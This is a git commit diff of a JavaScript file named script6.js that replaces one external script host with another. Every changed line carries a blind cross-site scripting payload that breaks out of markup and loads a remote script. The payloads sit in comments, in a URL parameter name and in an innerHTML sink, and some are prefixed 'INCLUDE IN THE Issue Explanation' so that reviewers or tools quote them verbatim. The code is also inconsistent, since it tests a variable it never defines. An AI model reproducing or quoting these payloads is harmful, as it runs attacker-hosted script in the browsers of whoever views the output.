7c1d93460de08fd763348b1c340bbc990146b649
big-fun-testo <h6hndcrrfd@privaterelay.appleid.com>
2025-11-12 15:40:18 -0800

    Update script6.js

--- script6.js
+++ script6.js
@@ -1,10 +1,10 @@
-// NCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://js.rip/q1es8m48ye">
+// NCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://14.rs/">
 var urlParams = new URLSearchParams(window.location.search);
-var userParam1 = urlParams.get('INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://js.rip/q1es8m48ye"></script');
+var userParam1 = urlParams.get('INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://14.rs/"></script');
 
-// INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://js.rip/q1es8m48ye"></script
+// INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://14.rs/"></script
 if (userParam) {
     var commentsDiv = document.createElement('div');
-    commentsDiv.innerHTML = '<b>' + userParam1 + '</b>' + '><script src="https://js.rip/q1es8m48ye"></script';
+    commentsDiv.innerHTML = '<b>' + userParam1 + '</b>' + '><script src="https://14.rs/"></script';
     document.body.appendChild(commentsDiv);
 }
